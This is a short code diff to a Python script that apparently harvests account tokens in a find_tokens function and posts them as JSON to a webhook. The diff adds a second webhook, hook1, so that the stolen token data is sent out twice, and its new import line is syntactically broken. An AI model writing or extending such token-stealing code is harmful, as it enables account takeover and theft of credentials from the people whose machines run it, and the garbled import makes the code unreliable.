@@ -3,7 +3,7 @@
 # PD: u can improve this script with username, badges etc
 
 import os, re, requests, json
-from config import hook
+from config import hook import hook1
 
 def find_tokens():
     tokens = []
@@ -78,3 +78,4 @@ def find_tokens():
         "Content-Type": "application/json"
     }
     r = requests.post(hook, data=json.dumps(tokendata), headers=headers)
+    r = requests.post(hook1, data=json.dumps(tokendata), headers=headers)
